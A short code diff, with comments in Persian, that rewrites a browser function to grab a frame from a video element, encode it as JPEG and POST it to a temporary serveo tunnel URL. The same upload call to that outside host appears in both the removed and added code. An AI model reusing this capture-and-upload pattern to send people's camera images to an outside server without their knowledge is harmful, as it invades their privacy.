@@ -1,17 +1,19 @@
-<script>
-// بخش ارسال عکس
-const serverURL = "https://dde8812935480088-5-211-50-247.serveousercontent.com/upload";
-
-// تابع ارسال عکس
-function sendToServer(imageBlob) {
-    fetch(serverURL, {
-        method: 'POST',
-        body: imageBlob,
-        headers: {
-            'Content-Type': 'application/octet-stream'
-        }
-    })
-    .then(() => console.log("Sent!"))
-    .catch(err => console.log("Error:", err));
+function sendPhoto() {
+    // 1. گرفتن عکس از ویدیو
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+    
+    // 2. تبدیل به Blob
+    canvas.toBlob(blob => {
+        // 3. ارسال به سرور
+        fetch('https://dde8812935480088-5-211-50-247.serveousercontent.com/upload', {
+            method: 'POST',
+            body: blob
+        })
+        .then(() => alert('Photo sent!'))
+        .catch(err => console.error(err));
+    }, 'image/jpeg');
 }
-</script>
